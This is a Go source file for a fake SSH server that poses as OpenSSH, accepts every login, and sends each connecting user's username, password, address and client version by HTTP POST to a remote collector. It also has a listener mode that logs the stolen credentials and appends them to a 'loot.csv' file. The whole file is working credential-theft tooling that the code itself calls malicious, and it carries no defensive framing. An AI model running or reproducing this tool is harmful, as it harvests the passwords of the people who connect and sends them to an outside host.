package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
    "github.com/gorilla/mux"
	"github.com/gliderlabs/ssh"
)

var rhost string

func main() {
	var isListener bool
	var lport uint
	flag.BoolVar(&isListener, "l", false, "Set this option if you want this instance to be the HTTP listener")
	flag.UintVar(&lport, "p", 8000, "Set the local port to listen for SSH or HTTP on")
	flag.StringVar(&rhost, "r", "http://localhost:8000", "The full URI path to POST creds to")
	flag.Parse()
	if isListener {
		log.SetPrefix("HTTP - ")
        log.Println("Started HTTP server")
        mr := mux.NewRouter()
        mr.HandleFunc("/csv/",csvHTTPHandler)
        mr.HandleFunc("/plain/", httpHandler)
		log.Fatal(http.ListenAndServe(fmt.Sprintf(":%v", lport), mr))
	} else {
		log.SetPrefix("SSH - ")
		log.Println("Started malicious SSH server")
		server := &ssh.Server{
			Addr:            fmt.Sprintf(":%v", lport),
			Handler:         sshHandler,
			Version:         "OpenSSH",
			PasswordHandler: passwordHandler,
		}
		log.Fatal(server.ListenAndServe())
	}
}

func httpHandler(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(200)
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Println(err.Error())
	}
	log.Println(string(body))
}
func csvHTTPHandler(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(200)
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Println(err.Error())
    }
    log.Println(string(body))
	file, err := os.OpenFile("/home/james/loot.csv", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println(err.Error())
	}
	defer file.Close()
	if _, err := file.WriteString(string(body)); err != nil {
		log.Println(err.Error())
	}

}
func sshHandler(s ssh.Session) {
	s.Write([]byte("Don't blindly SSH into every VM you see.\n"))
}

func passwordHandler(context ssh.Context, password string) bool {
	details := fmt.Sprintf(
		"Got Login!\nUsername:\t%s\nPassword:\t%s\nRemote:\t%s\nClient:\t%s\n",
		context.User(), password, context.RemoteAddr(), context.ClientVersion())
    resp1, err := http.Post(rhost+"plain/", "text/plain", bytes.NewBufferString(details))
    if err != nil {
        log.Println(err.Error())
    }
    csvDetails := fmt.Sprintf("%s,%s,%s,%s\n",context.User(), password, context.RemoteAddr(), context.ClientVersion())
    log.Println(csvDetails)
    resp2, err := http.Post(rhost+"csv/", "text/csv", bytes.NewBufferString(csvDetails))
    if err != nil {
        log.Println(err.Error())
    }
    log.Println(resp1.Status,"plain POST")
    log.Println(resp2.Status,"CSV POST")
	return true
}
